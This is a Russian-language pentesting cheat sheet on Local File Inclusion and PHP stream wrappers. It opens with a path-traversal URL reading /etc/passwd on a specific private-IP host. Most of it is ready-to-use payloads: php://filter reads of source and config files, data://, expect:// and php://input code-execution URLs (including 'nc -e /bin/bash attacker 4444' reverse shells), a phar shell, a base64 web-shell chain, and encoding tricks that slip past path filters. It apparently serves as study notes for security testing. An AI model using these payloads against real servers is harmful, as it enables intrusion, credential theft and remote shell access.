# Уязвимость заключается в том, что при отсутствии фильтрации на сервере можно загружать всю директорию и получить доступ к каталогу на сервере.

http://10.48.181.120/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd


# Почему /etc/passwd не прочитается напрямую?
**Если вы сделаете ?page=../../../../etc/passwd:**

1. PHP попытается выполнить /etc/passwd как PHP-код

2. Содержимое /etc/passwd не содержит PHP-тегов <?php ?>

3. PHP просто проигнорирует текст и ничего не выведет

3. Увидим пустую страницу!

## 1. ***---КАК ЭТО ОБОЙТИ? - PHP Wrappers при LFI---***(никакие доп. настройки php не нужны, работает в 99% случаев, когда есть уязвимый параметры без санитизации и валидации)

# PHP-wrapper это обработчики с которыми работает сервер, они задаются в настройках сервера, allow_url_fopen: Эта директива глобально разрешает или запрещает использование всех URL-обёрток (таких как http://, ftp://, gopher://) в функциях типа file_get_contents. Когда PHP встречает в функции (например, file_get_contents или include) строку типа gopher://..., он вызывает встроенный обработчик этого протокола, который умеет с ним работать. Везде один принцип и в php и в js(Браузере): программа распознаёт протокол и вызывает встроенный обработчик. Если обработчика нет — протокол не работает.

**Суть уязвимости:** PHP wrappers позволяют читать файлы на сервере через LFI, когда прямое включение не отображает содержимое (файл выполняется, а не выводится).

**Пример эксплуатации:**
http://target.com/?page=php://filter/convert.base64-encode/resource=/etc/passwd

- Сервер возвращает base64-строку
- Атакующий декодирует и получает содержимое файла

**Зачем нужно:**
- Обход выполнения PHP-кода (файл читается как данные, а не исполняется)
- Чтение исходников PHP-файлов (config.php с паролями)
- Чтение файлов, когда включение не выводит данные напрямую

**Применимость:**
- ✅ Работает только для LFI (Local File Inclusion)
- ❌ Не нужно для RFI (Remote File Inclusion) — там файл с удаленного сервера и так выполняется
- ❌ Не нужно, если LFI и так выводит содержимое (редко в реальных приложениях)

## 2.---Data wrapper = LFI с возможностью RCE (когда allow_url_include=On)

**Назначение:** Внедрение и выполнение PHP-кода напрямую через URL (когда allow_url_include=On)

**Базовый синтаксис:**
data://text/plain,<?php [код] ?>
data://text/plain;base64,[base64-код]

**Примеры:**
http://target.com/page=data://text/plain,<?php phpinfo(); ?>
http://target.com/page=data://text/plain,<?php system('id'); ?>
http://target.com/page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8%2B
http://target.com/page=data://text/plain,<?php system('nc -e /bin/bash attacker 4444'); ?>

## 3. Expect Wrapper (RCE)
**Назначение:** Выполнение системных команд (требует установленного модуля expect)

**Синтаксис:**
expect://command

**Пример:**
http://target.com/page=expect://id
http://target.com/page=expect://ls -la
http://target.com/page=expect://nc -e /bin/bash attacker 4444

## 4. Input Wrapper (LFI + RCE) ( Без allow_url_include = On работать не будет)
**Назначение:** Чтение сырых данных из тела POST-запроса как PHP-код

**Синтаксис:**
php://input

**Пример:**
curl -X POST -d "<?php system('id'); ?>" "http://target.com/page=php://input"

## 5. PHAR Wrapper
**Назначение:** Десериализация объектов через PHAR-файлы

**Синтаксис:**
phar://path/to/file.phar

**Пример:**
http://target.com/page=phar://./uploads/shell.phar

## 6. PHP Filter + Data комбо (RCE без allow_url_include)

**Синтаксис:**
php://filter/convert.base64-decode/resource=data://plain/text,[base64-код]

**Создание payload:**
"<?php system(\$_GET['cmd']); ?>" <---- кодируем в base64
# PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg==

# Сначала внедряем payload без cmd! CMD уже после в url
http://target.com/playground.php?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSEnOzs/Pgo&cmd=id

# Что происходит:

1. Сервер получает base64-строку
2. Фильтр декодирует её в PHP-код
3. PHP выполняет код
4. Появляется параметр cmd для коман

## Сводка по применению:

| Wrapper | Тип | Что делает |
|---------|-----|------------|
| php://filter | LFI | Читает файлы (base64/rot13) |
| data:// | LFI/RFI | Выполняет код из URL |
| expect:// | RCE | Выполняет команды |
| php://input | LFI/RFI | Выполняет код из POST |
| phar:// | LFI | Десериализация |



*** ОБФУСКАЦИЯ И ОБХОДЫ ***

/var/www/html/..//..//..//etc/passwd   <!-- двойные слэши могут игнорироваться валидацией, а отрабатывать как один слэш -->

/var/www/html%252F%252E%252E%252F%252F%252E%252E%252F%252F%252E%252E%252F%252Fetc%252Fpasswd   <!-- URL-энкодинг двойных слэшей и точек, можно сделать двойной энкодинг -->

# LFI СЛОВАРЬ:
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt